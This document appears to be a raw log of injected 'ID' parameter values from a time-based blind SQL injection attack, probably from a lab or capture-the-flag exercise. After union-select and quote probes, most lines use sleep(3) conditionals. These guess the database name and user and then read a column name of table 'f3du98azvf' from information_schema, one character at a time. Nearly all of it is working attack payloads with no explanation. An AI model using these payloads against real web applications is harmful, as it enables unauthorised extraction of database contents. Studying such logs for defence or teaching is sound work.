ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1 and if(left(database(),1)='a',0,sleep(3))
ID:1 and if(left(database(),1)='a',0,sleep(3)) #
ID:1' and if(left(database(),1)='a',0,sleep(3)) #
ID:1' and if(left(database(),1)='s',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='a',0,sleep(3)) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'l') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'm') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'n') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'o') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'p') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'q') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'r') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 's') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),2) = 'sa') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),2) = 'sb') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),2) = 'sc') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),2) = 'sd') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),2) = 'se') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sea') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'seb') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sec') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sed') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'see') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sef') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'seg') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'seh') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sei') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sej') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sek') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sel') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sem') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sen') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'seo') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'sep') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'seq') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'ser') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),3) = 'ses') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesa') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesb') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesc') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesd') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sese') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesf') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesg') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesh') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesi') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesj') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesk') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesl') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesm') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesn') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'seso') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesp') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesq') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sesr') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),4) = 'sess') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessa') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessb') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessc') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessd') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sesse') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessf') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessg') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessh') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),5) = 'sessi') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),6) = 'sessia') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),6) = 'sessib') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),6) = 'sessic') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),6) = 'sessid') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessida') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidb') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidc') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidd') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sesside') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidf') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidg') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidh') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidi') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidj') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidk') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidl') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidm') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidn') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessido') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidp') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidq') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidr') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessids') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidt') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidu') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidv') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidw') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidx') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidy') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidz') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidA') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidB') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidC') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidD') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidE') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidF') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidG') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),7) = 'sessidH') , sleep(3) , 0) #
